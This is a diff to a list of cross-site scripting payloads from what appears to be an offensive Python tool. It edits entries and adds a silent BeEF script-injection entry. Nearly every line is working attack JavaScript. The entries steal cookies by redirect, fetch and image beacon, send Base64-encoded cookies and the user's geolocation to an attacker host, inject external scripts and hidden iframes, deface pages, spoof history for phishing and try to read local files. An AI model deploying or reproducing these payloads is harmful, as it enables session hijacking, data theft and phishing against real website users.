@@ -25,33 +25,33 @@ payloads = [
     
     "alert('XSS!');", "Basic XSS test",
 
-    """document.write('<script src="https://ARGUMENT/ARGUMENT.js"></script>');""", "Inject external script, good for the BeEF hook",
+    """document.write('<script src="http://ARGUMENT/ARGUMENT.js"></script>');""", "External script injection, good for the BeEF hook",
 
-    """window.location='https://ARGUMENT/ARGUMENT?cookie='+document.cookie;""", "Cookie theft via redirection",
+    """document.body.innerHTML += '<script src="http://ARGUMENT/ARGUMENT.js"></script>';""", "Silent external script injection, good for the BeEF hook",
 
-    """fetch('https://ARGUMENT/ARGUMENT?cookie=' + document.cookie);""", "Cookie exfiltration via fetch",
+    """window.location='http://ARGUMENT/ARGUMENT?cookie='+document.cookie;""", "Cookie theft via redirection",
 
-    """new Image().src='https://ARGUMENT/ARGUMENT?data='+document.cookie;""", "Steal data via image request",
+    """fetch('http://ARGUMENT/ARGUMENT?cookie=' + document.cookie);""", "Cookie exfiltration via fetch",
 
-    """document.body.innerHTML += '<iframe src="https://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",
+    """new Image().src='http://ARGUMENT/ARGUMENT?data='+document.cookie;""", "Steal data via image request",
 
-    """document.body.innerHTML += '<script src="https://ARGUMENT/ARGUMENT.js"></script>';""", "Silent script injection",
+    """document.body.innerHTML += '<iframe src="http://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",
 
-    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding",
+    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding, xss is 'alert('xss')",
 
-    """var img = new Image(); img.src = 'https://ARGUMENT/ARGUMENT?data=' + btoa(document.cookie);""", "Data exfiltration via Base64",
+    """var img = new Image(); img.src = 'http://ARGUMENT/ARGUMENT?data=' + btoa(document.cookie);""", "Data exfiltration via Base64",
 
-    """setTimeout("alert('XSS via setTimeout')", 1000);""", "Delayed XSS execution",
+    """setTimeout("ARGUMENT", 1000);""", "Delayed XSS execution, 'ARGUMENT' is javascript code",
 
-    """setInterval("alert('XSS via setInterval')", 5000);""", "Persistent XSS execution",
+    """setInterval("ARGUMENT", 5000);""", "Persistent XSS execution, 'ARGUMENT' is javascript code",
 
-    """document.body.innerHTML = '<h1>Defaced!</h1>';""", "Simple defacement attack",
+    """document.body.innerHTML = 'ARGUMENT';""", "Basic defacement attack, 'ARGUMENT' is html code",
 
-    """window.open('https://ARGUMENT', '_blank');""", "Force user to open malicious site",
+    """window.open('http://ARGUMENT', '_blank');""", "Force user to open a site",
 
-    """history.replaceState({}, '', 'https://ARGUMENT');""", "Modify browser history for phishing attacks",
+    """history.replaceState({}, '', 'http://ARGUMENT');""", "Modify browser history, good for phishing attacks",
 
-    """navigator.geolocation.getCurrentPosition(p => fetch('https://ARGUMENT/ARGUMENT?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude));""", "Steal geolocation data",
+    """navigator.geolocation.getCurrentPosition(p => fetch('http://ARGUMENT/ARGUMENT?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude));""", "Steal geolocation data",
 
     """fetch('file:///ARGUMENT').then(response => response.text()).then(data => console.log(data));""", "Try to access local files (Only works in specific contexts)"
 ]
